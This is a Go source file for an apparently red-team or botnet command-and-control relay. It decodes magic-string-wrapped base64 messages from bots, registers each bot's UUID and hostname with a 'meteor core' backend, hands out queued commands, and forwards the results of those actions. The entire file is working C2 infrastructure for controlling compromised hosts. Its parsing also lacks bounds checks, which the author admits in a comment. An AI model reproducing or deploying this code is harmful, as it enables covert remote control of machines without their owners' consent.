package server

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
)

// Metserver is a struct that holds the important server metadata
type Metserver struct {
	core         string // address:port of meteor core
	magic        []byte // byte representation of the magicstring
	magicstring  string // string representation of magicstring
	magicterm    []byte // byte representation of magicterm
	magictermstr string // string representation of magicterm
}

// GenMetserver creates a new Metserver object given the values and returns it
func GenMetserver(core string, magic []byte, magicstring string, magicterm []byte, magictermstr string) Metserver {
	m := Metserver{core, magic, magicstring, magicterm, magictermstr}
	return m
}

//take buffer from conn handler, turn it into a string
func decodePayload(payload string, m Metserver) string {
	encodedPayload := strings.Replace(payload, m.magicstring, "", -1) //trim magic chars from payload
	encodedPayload = strings.Replace(encodedPayload, m.magictermstr, "", -1)
	data, err := base64.StdEncoding.DecodeString(encodedPayload)
	if err != nil {
		return ""
	}
	return string(data)
}

//turn the normal string into a MAD payload
func encodePayload(data string, m Metserver) string {
	encStr := base64.StdEncoding.EncodeToString([]byte(data))
	fin := m.magicstring + encStr + m.magictermstr
	return fin
}

// HandlePayload take string of payload, depending on mode/arguments: pass to handler functions
func HandlePayload(payload string, m Metserver) string {
	payload = decodePayload(payload, m)
	fmt.Println("HandlePayload decPayload: " + payload)
	splitPayload := strings.SplitN(payload, "||", 3)
	mode := splitPayload[0]
	aid := splitPayload[1]
	data := splitPayload[2]
	retval := ""
	switch mode {
	case "C":
		retval = registerBot(data, m)
	case "D":
		retval = getCommands(data, m)
	case "E":
		retval = addResult(data, aid, m)
	default:
		return ""
	}
	r := encodePayload(retval, m)
	return r
}

// take params from bot and register it in the DB
func registerBot(payload string, m Metserver) string {
	url := m.core + "/register/bot"
	splitPayload := strings.Split(payload, "||")
	uid := splitPayload[0]
	intrv := splitPayload[1]
	dlt := splitPayload[2]
	hn := splitPayload[3]

	cli := http.Client{}
	type Registration struct {
		UUID     string `json:"uuid"`
		Interval string `json:"interval"`
		Delta    string `json:"delta"`
		Hostname string `json:"hostname"`
	}

	data := Registration{
		UUID:     uid,
		Interval: intrv,
		Delta:    dlt,
		Hostname: hn,
	}
	jsonReg, err := json.Marshal(data)
	if err != nil {
		panic(err)
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonReg))
	req.Header.Set("Content-Type", "application/json")
	resp, err := cli.Do(req)
	if err != nil {
		return "Error: Unable to reach server"
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return string(body)
}

//split commands into a format the bot can easily read
func parseCommands(cstr string) string {
	retStr := ""
	carr := strings.Split(cstr, "}, {")
	for _, comStr := range carr {
		comStr = strings.Replace(comStr, "[{", "", 1)
		comStr = strings.Replace(comStr, "}]", "", 1)
		comStr = strings.Replace(comStr, "'id': ", "", 1)
		comStr = strings.Replace(comStr, ", 'mode': '", ":", 1)
		comStr = strings.Replace(comStr, "', 'arguments': '", ":", 1)
		comStr = strings.Replace(comStr, "', 'options': ''", "", 1)
		retStr = retStr + comStr + "<||>"
	}
	retStr = strings.TrimSuffix(retStr, "<||>")
	return retStr
}

// pull all commands from DB associated with hostname
func getCommands(payload string, m Metserver) string {
	url := m.core + "/get/command"
	uid := payload
	cli := http.Client{}
	type GetCom struct {
		UUID string `json:"uuid"`
	}

	data := GetCom{
		UUID: uid,
	}
	jsonGetCom, err := json.Marshal(data)
	if err != nil {
		panic(err)
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonGetCom))
	req.Header.Set("Content-Type", "application/json")
	resp, err := cli.Do(req)
	if err != nil {
		return "Error: Unable to reach server"
	}
	body, _ := ioutil.ReadAll(resp.Body)
	if string(body) == "[]" {
		return "0:0:0" // return no commands
	}
	prsd := parseCommands(string(body))
	return prsd
}

// send the post request with actionID and result data
func postResult(aid string, result string, m Metserver) {
	if _, err := strconv.Atoi(aid); err != nil { // if actionID isn't an int, exit
		return // shitty error checking but I'm just trying stuff
	}
	url := m.core + "/add/actionresult"
	cli := http.Client{}
	type PostRes struct {
		Actionid string `json:"actionid"`
		Data     string `json:"data"`
	}

	data := PostRes{
		Data:     result,
		Actionid: aid,
	}
	jsonReg, err := json.Marshal(data)
	if err != nil {
		panic(err)
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonReg))
	req.Header.Set("Content-Type", "application/json")
	cli.Do(req)
	return
}

// send the action result back to the DB for feedback tracking
func addResult(payload string, aid string, m Metserver) string {
	if payload == "None" {
		return "Done"
	}
	fmt.Println("addResult PAYLOAD: " + payload)
	resArray := strings.Split(payload, "<||>")
	for _, res := range resArray {
		splitRes := strings.Split(res, ":")
		aid := splitRes[0]
		result := splitRes[1]
		postResult(aid, result, m)
	}
	return "Done"
}
